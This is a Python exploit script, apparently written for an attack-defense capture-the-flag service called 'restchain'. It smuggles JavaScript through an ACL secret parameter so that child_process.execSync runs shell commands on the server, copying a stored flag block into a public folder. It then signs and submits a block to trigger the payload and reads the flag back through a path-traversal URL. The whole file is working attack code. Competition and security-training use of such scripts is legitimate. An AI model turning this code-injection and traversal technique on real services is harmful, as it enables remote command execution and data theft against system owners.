#!/usr/bin/env python3

import time
import requests

def exploit(api, flagid):
	code = """
	exploit',(function(){
		require('child_process').execSync('
		x()(
			b=BLOCK;
			d=$2/data;
			p=$1/restchain-persist;
			s=$d/blocks/$b;
			d=$d/public/acl-code-injection/$b;
			test -x $p -a -f $s && $p $d < $s;
		);
		x /srv/restchain/bin /srv/restchain || x ./bin . || x . . || :
	');})(),'
	""".replace('\n', '').replace('\t', '').replace('BLOCK', flagid[:2] + '/' + flagid)
	print('generated code:', code)

	res = requests.get(api + '/acl/require-secret', params={'secret': code})
	assert res.status_code == 200
	acl = res.text.strip()
	print('got acl:', repr(acl))

	res = requests.get(api + '/crypto/privatekey')
	assert res.status_code == 200
	priv = res.headers['X-Restchain-Private-Key']
	pub = res.headers['X-Restchain-Public-Key']
	headers = {
		'X-Restchain-Acl-Secret': 'exploit',
		'X-Restchain-Block-Acl': acl,
		'X-Restchain-Previous': '6' * 64,
		'X-Restchain-Private-Key': priv,
		'X-Restchain-Signer': pub,
	}
	res = requests.post(api + '/crypto/sign', headers=headers)
	assert res.status_code == 200
	headers['X-Restchain-Signature'] = res.headers['X-Restchain-Signature']
	res = requests.put(api + '/block', headers=headers)
	assert res.status_code == 200

	res = requests.get(api + '/../acl-code-injection/' + flagid[:2] + '/' + flagid)
	assert res.status_code == 200
	print('-' * 80)
	print(res.text)

if __name__ == '__main__':
	import sys
	exploit(*sys.argv[1:])
